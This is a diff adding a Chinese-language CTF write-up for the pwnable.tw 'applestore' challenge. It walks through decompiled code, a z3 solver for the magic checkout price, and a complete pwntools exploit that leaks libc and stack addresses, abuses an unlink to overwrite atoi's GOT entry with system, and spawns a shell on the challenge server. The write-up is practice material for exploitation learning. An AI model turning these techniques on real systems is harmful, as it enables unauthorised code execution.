@@ -311,3 +311,100 @@ arb_write(fini_array+0x58,b"/bin/sh\x00")
 arb_write(fini_array,p64(leave)+p64(rdi))
 p.interactive()
 ```
+
+## applestore
+
+添加的各个商品之间以双向链表的形式串联在一起。delete里有熟悉的unlink操作：
+```c
+    if (idx == item_number) {
+                    /* 双向链表，next */
+      item_number = local_38[2];
+      prev = local_38[3];
+      if (prev != 0) {
+        *(int *)(prev + 8) = item_number;
+      }
+      if (item_number != 0) {
+        *(int *)(item_number + 0xc) = prev;
+      }
+    }
+```
+但目前并没有触发的契机。checkout处倒是很可疑：
+```c
+  if (total_price == 0x1c06) {
+    puts("*: iPhone 8 - $1");
+    asprintf(&local_24,"%s","iPhone 8");
+    local_20 = 1;
+    insert(&local_24);
+  }
+```
+如果当前添加的商品价格等于0x1c06，就会额外link进一个位于栈上的变量。绝对有猫腻，先用z3凑出0x1c06：
+```py
+from z3 import *
+s=Solver()
+x=Int('x')
+y=Int('y')
+z=Int('z')
+m=Int('m')
+s.add(x>=0)
+s.add(y>=0)
+s.add(z>=0)
+s.add(m>=0)
+s.add(x*199+y*299+z*499+m*399==0x1c06)
+if s.check()==sat:
+    print(s.model())
+```
+然后调试发现，local_24的地址在调用cart时的next字段正好指向handler里接收用户输入的buffer。借此可以泄漏libc地址
+
+不知道怎么执行下一步了。unlink操作看起来可以将某个函数的got表写为system，但副作用是system周围也会被写入，而函数所在的内存肯定是不可写的，程序会炸掉。那往栈上考虑吧，去environ拿栈地址。结果我发现environ的栈地址与任何函数的栈帧的偏移都不是固定的……想了很久仍然不知道还有什么方法，放弃了
+
+今天看 https://blog.srikavin.me/posts/pwnable-tw-applestore 时发现和我的思路差不多？为什么这里泄漏的environ和delete函数的ebp偏移固定？我把脚本拿下来打远程，成功了；但本地却无法成功，gdb调试发现偏移仍然是不固定的
+
+所以一定要用docker啊！
+```py
+from pwn import *
+exe_path = './applestore_patched'
+exe=ELF(exe_path)
+libc=ELF("./libc_32.so.6")
+p=remote("chall.pwnable.tw",10104)
+def select(value,option):
+    if value=='':
+        p.sendlineafter("> ",option)
+    else:
+        p.sendafter("> ",value)
+def add(device):
+    p.sendlineafter("> ",'2')
+    p.sendlineafter("> ",str(device))
+def checkout(value=''):
+    select(value,'5')
+    p.sendlineafter("> ",'y')
+def cart(value='',prompt=''):
+    select(value,'4')
+    select(prompt,'y')
+def delete(idx,value=''):
+    select(value,'3')
+    p.sendlineafter("Number> ",str(idx))
+for i in range(10):
+    add(1)
+for i in range(2):
+    add(3)
+for i in range(14):
+    add(2)
+checkout()
+cart(p32(0x804b034)+p32(0)*3) #atoi只要第一个字符是数字就好，后面的不是数字也不影响。0x804b034正好是一个以字符'4'结尾的got项
+p.recvuntil("28: ")
+libc.address=u32(p.recv(4))-0x18540
+cart(prompt=b'yy'+p32(libc.sym['environ'])+p32(0)*2) #cart里还有一个提示用户输入的地方，这个地方的地址+2正好和上述的地址一样
+#直接用第一个cart的泄漏方式也行，但这样泄漏的就不是environ的内容，而是environ指向的内容。不知道这样泄漏出来的地址在远程与ebp的偏移是否固定
+p.recvuntil("27: ")
+ebp=u32(p.recv(4))-260
+delete(28,p32(0x804b033)+p32(0)+p32(ebp-0xc)+p32(exe.got['atoi']+0x22)) #触发unlink，让ebp为atoi的got表+0x22
+'''
+handler函数的输入变量位于ebp-0x22:
+        08048c05 8d 45 de        LEA        EAX=>input_value,[EBP + -0x22]
+        08048c08 89 04 24        MOV        dword ptr [ESP]=>local_3c,EAX
+        08048c0b e8 89 fb        CALL       my_read
+                 ff ff
+'''
+p.sendafter(b'>', p32(libc.symbols['system']) + b';/bin/sh;') #于是此处用system覆盖了atoi的got表，紧接着就调用atoi触发system
+p.interactive()
+```
